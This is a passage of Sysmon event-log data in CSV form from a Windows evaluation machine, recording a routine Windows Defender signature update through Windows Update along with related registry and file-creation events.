Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,Details,EventID,EventRecordID,EventType,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,TargetObject,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,DWORD (0x00000003),13,19593,SetValue,,,C:\Windows\system32\services.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f5-658c-0b00-000000000f00},3588,780,,,,,,"T1031,T1050",,,,,,2023-12-27T18:55:58.7171380Z,,HKLM\System\CurrentControlSet\Services\WdNisDrv\Start,13,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:58.711,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:58.7171380Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1031,T1050</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:58.711</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f5-658c-0b00-000000000f00}</Data>
      <Data Name=""ProcessId"">780</Data>
      <Data Name=""Image"">C:\Windows\system32\services.exe</Data>
      <Data Name=""TargetObject"">HKLM\System\CurrentControlSet\Services\WdNisDrv\Start</Data>
      <Data Name=""Details"">DWORD (0x00000003)</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 18:55:51.286,,,,,,,,,11,19592,,,,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f8-658c-4a00-000000000f00},3588,3552,,,,,,DLL,,,,,,2023-12-27T18:55:51.3014878Z,C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{C94E061A-18CA-4900-B39B-6E7FFC2C39C4}\mpengine.dll,,11,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:51.286,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:51.3014878Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:51.286</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-4a00-000000000f00}</Data>
      <Data Name=""ProcessId"">3552</Data>
      <Data Name=""Image"">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe</Data>
      <Data Name=""TargetFilename"">C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{C94E061A-18CA-4900-B39B-6E7FFC2C39C4}\mpengine.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 18:55:51.286</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,1.403.1211.0,13,19591,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f8-658c-3e00-000000000f00},3588,3212,,,,,,InvDB-Ver,,,,,,2023-12-27T18:55:48.6674840Z,,\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\BinProductVersion,13,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.653,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.6674840Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Ver</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.653</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-3e00-000000000f00}</Data>
      <Data Name=""ProcessId"">3212</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\BinProductVersion</Data>
      <Data Name=""Details"">1.403.1211.0</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,12/27/2023 12:10:06,13,19590,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f8-658c-3e00-000000000f00},3588,3212,,,,,,InvDB-CompileTimeClaim,,,,,,2023-12-27T18:55:48.6674279Z,,\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\LinkDate,13,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.653,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.6674279Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-CompileTimeClaim</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.653</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-3e00-000000000f00}</Data>
      <Data Name=""ProcessId"">3212</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\LinkDate</Data>
      <Data Name=""Details"">12/27/2023 12:10:06</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,microsoft corporation,13,19589,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f8-658c-3e00-000000000f00},3588,3212,,,,,,InvDB-Pub,,,,,,2023-12-27T18:55:48.6671075Z,,\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\Publisher,13,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.653,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.6671075Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Pub</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.653</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-3e00-000000000f00}</Data>
      <Data Name=""ProcessId"">3212</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\Publisher</Data>
      <Data Name=""Details"">microsoft corporation</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,c:\windows\softwaredistribution\download\install\am_delta_patch_1.403.1203.0.exe,13,19588,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-36f8-658c-3e00-000000000f00},3588,3212,,,,,,InvDB-Path,,,,,,2023-12-27T18:55:48.6669452Z,,\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\LowerCaseLongPath,13,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.653,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.6669452Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Path</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.653</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-3e00-000000000f00}</Data>
      <Data Name=""ProcessId"">3212</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{b3b14332-edc6-625a-c682-62677f6d06d4}\Root\InventoryApplicationFile\am_delta_patch_1|a4ee9b7ce203d4f4\LowerCaseLongPath</Data>
      <Data Name=""Details"">c:\windows\softwaredistribution\download\install\am_delta_patch_1.403.1203.0.exe</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\MpSigStub.exe /stub 1.1.23080.1001 /payload 1.403.1211.0 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe WD /q,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Microsoft Malware Protection Signature Update Stub,,,,,,,1,19587,,1.1.23080.1001 (3160dd13d0f6a295f1d64f8fb862141832f637bb),"MD5=5598A4C4A5F166060BDE5F6983522F44,SHA256=896F1793CA8BDA909A71217F41A93AF5A06354C1EA9EA81C975D429224B28E19,IMPHASH=61A67B5C850CC035A3E3016768298329",C:\Windows\System32\MpSigStub.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,MpSigStub.exe,"""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer",C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe,{f57bd86a-7333-658c-cd01-000000000f00},10116,NT AUTHORITY\SYSTEM,{f57bd86a-7334-658c-cf01-000000000f00},3588,5268,Microsoft Malware Protection,,,,,-,,,,,,2023-12-27T18:55:48.1314430Z,,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.130,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.1314430Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.130</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7334-658c-cf01-000000000f00}</Data>
      <Data Name=""ProcessId"">5268</Data>
      <Data Name=""Image"">C:\Windows\System32\MpSigStub.exe</Data>
      <Data Name=""FileVersion"">1.1.23080.1001 (3160dd13d0f6a295f1d64f8fb862141832f637bb)</Data>
      <Data Name=""Description"">Microsoft Malware Protection Signature Update Stub</Data>
      <Data Name=""Product"">Microsoft Malware Protection</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">MpSigStub.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\MpSigStub.exe /stub 1.1.23080.1001 /payload 1.403.1211.0 /MpWUStub /program C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe WD /q</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=5598A4C4A5F166060BDE5F6983522F44,SHA256=896F1793CA8BDA909A71217F41A93AF5A06354C1EA9EA81C975D429224B28E19,IMPHASH=61A67B5C850CC035A3E3016768298329</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-7333-658c-cd01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10116</Data>
      <Data Name=""ParentImage"">C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe"" WD /q",Microsoft Corporation,WinDev2309Eval,,C:\Windows\SoftwareDistribution\Download\Install\,Microsoft Antimalware WU Stub,,,,,,,1,19586,,1.403.1211.0,"MD5=94F1A50DBF73549CF2D685FA9367A621,SHA256=61C6EF36554C5123B060AFF6C61B1788D9757B0C784E413BA2308BC94D748BCC,IMPHASH=E4FAD3D8447A7CE2C7526A030D0BF6B3",C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,AM_Delta_Patch_1.403.1203.0.exe,"""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer",C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe,{f57bd86a-7333-658c-cd01-000000000f00},10116,NT AUTHORITY\SYSTEM,{f57bd86a-7334-658c-ce01-000000000f00},3588,10620,Microsoft Malware Protection,,,,,-,,,,,,2023-12-27T18:55:48.1086997Z,,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.105,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.1086997Z""/>
      <EventRecordID>19586</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.105</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7334-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">10620</Data>
      <Data Name=""Image"">C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe</Data>
      <Data Name=""FileVersion"">1.403.1211.0</Data>
      <Data Name=""Description"">Microsoft Antimalware WU Stub</Data>
      <Data Name=""Product"">Microsoft Malware Protection</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">AM_Delta_Patch_1.403.1203.0.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe"" WD /q</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\SoftwareDistribution\Download\Install\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=94F1A50DBF73549CF2D685FA9367A621,SHA256=61C6EF36554C5123B060AFF6C61B1788D9757B0C784E413BA2308BC94D748BCC,IMPHASH=E4FAD3D8447A7CE2C7526A030D0BF6B3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-7333-658c-cd01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10116</Data>
      <Data Name=""ParentImage"">C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 18:55:48.012,,,,,,,,,11,19585,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-3716-658c-b600-000000000f00},3588,8748,,,,,,EXE,,,,,,2023-12-27T18:55:48.0249827Z,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe,,11,,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:48.012,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:48.0249827Z""/>
      <EventRecordID>19585</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">EXE</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:48.012</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-3716-658c-b600-000000000f00}</Data>
      <Data Name=""ProcessId"">8748</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""TargetFilename"">C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.403.1203.0.exe</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 18:55:48.012</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Update,,,,,,,1,19584,,1212.2309.20012.0,"MD5=B2C868E97CCA8BA1CCD744A2A94DF00F,SHA256=F6319EC9D549BB0DB96A0B4BBA3D29D2E74C48A888C02E0569DC3E6EE82C4B0A,IMPHASH=DD2FCC350B4D10E72C58408414AA6BD3",C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,wuaucltcore.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,{f57bd86a-3716-658c-b600-000000000f00},8748,NT AUTHORITY\SYSTEM,{f57bd86a-7333-658c-cd01-000000000f00},3588,10116,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:47.9798481Z,,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:47.978,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:47.9798481Z""/>
      <EventRecordID>19584</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:47.978</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7333-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">10116</Data>
      <Data Name=""Image"">C:\Windows\UUS\Packages\Preview\amd64\wuaucltcore.exe</Data>
      <Data Name=""FileVersion"">1212.2309.20012.0</Data>
      <Data Name=""Description"">Windows Update</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">wuaucltcore.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\uus\packages\preview\AMD64\wuaucltcore.exe"" /DeploymentHandlerFullPath \\?\C:\Windows\UUS\Packages\Preview\AMD64\UpdateDeploy.dll /ClassId 8ae7c467-dbae-48a8-a271-9005824abd1c /RunHandlerComServer</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=B2C868E97CCA8BA1CCD744A2A94DF00F,SHA256=F6319EC9D549BB0DB96A0B4BBA3D29D2E74C48A888C02E0569DC3E6EE82C4B0A,IMPHASH=DD2FCC350B4D10E72C58408414AA6BD3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-3716-658c-b600-000000000f00}</Data>
      <Data Name=""ParentProcessId"">8748</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Services,,,,,,,1,19583,,10.0.22621.1 (WinBuild.160101.0800),"MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791",C:\Windows\System32\svchost.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,svchost.exe,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{f57bd86a-36f5-658c-0b00-000000000f00},780,NT AUTHORITY\SYSTEM,{f57bd86a-7333-658c-cc01-000000000f00},3588,11196,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:47.2641818Z,,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:47.263,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:47.2641818Z""/>
      <EventRecordID>19583</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:47.263</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7333-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">11196</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Services</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">svchost.exe</Data>
